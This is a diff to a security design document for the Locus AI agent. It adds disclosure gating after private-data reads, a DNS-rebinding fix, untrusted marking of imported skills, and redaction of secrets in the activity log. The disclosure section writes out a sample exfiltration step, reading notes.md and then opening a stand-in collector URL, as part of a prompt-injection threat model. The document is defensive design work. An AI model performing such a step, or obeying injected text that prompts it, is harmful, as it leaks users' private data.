@@ -84,7 +84,7 @@ Taint is a policy decision inside `AgentLoop`. The system prompt, the tool list 
   The exception is a host the user set up in Locus: a provider's base URL (Ollama on the LAN) or an MCP server or connector. The refusal tells the agent to use `run_command` with `curl` for servers it started in Linux.
 - **Redirects** are followed by hand, at most 5 hops, and every hop is checked like the first. 301, 302 and 303 turn a POST into a GET without a body. An https to http downgrade is refused. Headers the agent set (an API key, say) go only to the host it named.
 - **Body cap.** The body is streamed and kept to at most 2 MB, whatever the server sends or claims. The result says when it stopped reading. The whole request has a 60 s limit.
-- **Residual risk.** The check resolves the name before the request, and OkHttp resolves it again to connect, so a DNS-rebinding server could answer differently the second time. Pinning the connection to the checked address needs a custom `Dns` on a dedicated client; that's left for later.
+- **DNS rebinding.** The check resolves the name before the request, and OkHttp resolves it again to connect, so a rebinding server could answer differently the second time. fetch_url therefore has a client of its own (`FetchDns`, core/data) whose OkHttp `Dns` runs every answer through `FetchGuard.checkAnswer`. Any private address, for a host the user didn't set up, fails the connection, and each redirect hop is a new checked lookup. See [network](network.md), "fetch_url and DNS rebinding".
 
 ## Memory provenance
 
@@ -96,6 +96,38 @@ Each memory topic's current version records a `MemoryProvenance` in `memory/.pro
 - `taintedBy`: the outside content the run had read when it saved, as tool names.
 
 Library shows "Saved by Locus in a chat · 2 Nov 2026, 14:05", with a link to that chat when it still exists (see [memory search](memory-search.md#provenance-in-library)). For a tainted save it also shows a caution line naming the sources and asking the user to check the note, and the collapsed row's meta says "· check". When the user edits and saves the note, it becomes theirs and the flag clears.
+
+## Disclosure: private data, then an address
+
+Taint covers (A) + (C). It didn't cover (B) + (C) without (A): a run that reads the user's own data and then opens an address. `browser_open`, a GET `fetch_url` and `web_read` are observations, so `ChatPolicy.modeDenial` lets them through in read-only and Workspace modes, and they default to Allow. `browser_open` only asked when the query was over 300 characters. `read_file` isn't a taint source. So in a read-only chat, `read_file notes.md` followed by `browser_open https://collect.example/4821` ran with no card: a PIN, one line of a file or a short token fits in a path. The model can be steered by text inside the private data itself (a file in the workspace, a mail), so "nothing outside was read" isn't enough.
+
+**How others handle it.**
+
+- **Claude Code** asks before a web fetch except for a built-in set of preapproved documentation domains, and remembers the approval per domain (`WebFetch(domain:example.com)`): https://code.claude.com/docs/en/permissions ("Permission system" table, "WebFetch"). Its security page lists "Network request approval: In Manual mode, most tools that make network requests require user approval by default", and WebFetch hands the model a summary of the page rather than the raw page (https://code.claude.com/docs/en/security, "Additional safeguards").
+- **Codex** runs with network access off by default, uses a web search cache rather than live pages by default, and its network policy is allowlist-first ("Domain rules are allowlist-first", "Exact hosts match only themselves"). It warns that "Prompt injection can cause the agent to fetch and follow untrusted instructions" (https://learn.chatgpt.com/docs/agent-approvals-security, "Network isolation", "Network policy").
+
+Both treat the destination host as the unit of trust and keep a short allowlist. Locus does the same, but only once the run holds something worth taking, so ordinary browsing keeps working.
+
+**The rule** (`Taint.disclosureReason`, applied in `AgentLoop.authorizeAndRun` for every chat mode):
+
+- A run has *read private data* once a call of a private-read tool succeeded (`Taint.isPrivateRead`): `read_file`, `search_files`, `code_outline`, `memory_read`, `memory_search`, `chat_history_search`, `chat_history_read`, `email_list`, `email_read`, `calendar_read`, `contacts_pick`, `git_inspect`, the deploy tools that return environment values, and `ssh_job_status`. Earlier turns of the chat count (`Taint.privateReadsIn`), and a helper inherits its parent's (`TaintSeed.privateReads`).
+- From then on, a URL observation asks (flag `PRIVATE_DATA`, "the task read your private data") when its host is **new** and the address **carries data**:
+  - *new*: not a host the user named or set up (the same `Taint.trusted` list taint uses), not loopback, not a host this run already opened, and not a safe destination;
+  - *carries data*: anything after the host beyond a bare `/`, so any path, query or fragment, at any length.
+- **Safe destinations** are pages whose request logs no third party can read: DuckDuckGo, Google and Bing search pages (`/?q=`, `/html/?q=`, `/search?q=`) and Wikipedia articles (`/wiki/…`). Only those paths: `google.com/url?q=…` and `duckduckgo.com/l/?uddg=…` are redirectors that would pass the data on, so they ask.
+- A background read-only run can't ask, so it refuses the call instead.
+- In a tainted run, taint already asks for any host the user didn't name; the card then shows the taint line, with both flags.
+- Calls that could gate run one at a time, never beside a private read (`RunTaint.couldGate`).
+
+What still works without a card after a private read: searching, opening a bare host, any host the user named or set up, local servers, and a second request to a host the run already opened.
+
+## Outside skills
+
+A skill imported from GitHub or a zip, or drafted by the agent (`skill_create`, even after the user approved it), was written by someone else. `skill_use` and `skill_read_file` now return its text inside `<untrusted_web_content>` with a note naming where it came from (`SkillTrust` in `home/HomeTools.kt`). The `<skill_content name="…">` wrapper stays first, so `SkillScope` still sees which skill was loaded. Because the result is marked, it is a taint source (`Taint.isSource`): after loading such a skill, opening a host the user didn't name, sending, or saving memory asks, as after reading a web page. A skill the user wrote themselves (no import record, not drafted by Locus) stays trusted and unmarked.
+
+## What the Activity log shows
+
+The audit log stores a call's arguments as the model sent them. The Activity screen shows them through `AuditRedactor` (`ActivityRepository.observe`), and so does every label built from them. It reuses `SecretScrubber` (the vault's values and the credential patterns of the "What was sent" viewer) and adds what arguments carry: values under secret-shaped keys (`Authorization`, `Cookie`, `password`, `api_key`, `*token*`, `*secret*`), form fields named or labelled as a password, card or one-time code, the password in `scheme://user:password@host`, and secret-looking query values (`token`, `key`, `sig`, `code`, …). Each is replaced by a label of its kind, such as `[redacted: Authorization header]` or `[redacted: saved secret]`. The stored rows and what the model gets are unchanged. Activity has no export of its own; chat exports already redact tool labels (`ChatExport`).
 
 ## Browser confirmation gate
 
@@ -110,3 +142,5 @@ Library shows "Saved by Locus in a chat · 2 Nov 2026, 14:05", with a link to th
 - Taint is per run, not per value. A tainted run asks for every outward call, including ones that only use the user's own data. That's the price of not tracking values.
 - `run_command` can reach the network by itself (`curl`), and it is a LOCAL tool, so it isn't gated by taint. Its normal Ask/Allow policy applies.
 - The host check is textual. `docs.example.org` is trusted when the user typed `example.org`.
+- Disclosure is per run too: after one `read_file`, a link with a path to any host the user didn't name asks once per host. Hosts the user named or set up never ask.
+- The Activity screen's text search still matches the stored arguments, so searching for a secret's exact value finds its row, though the row shows it redacted.
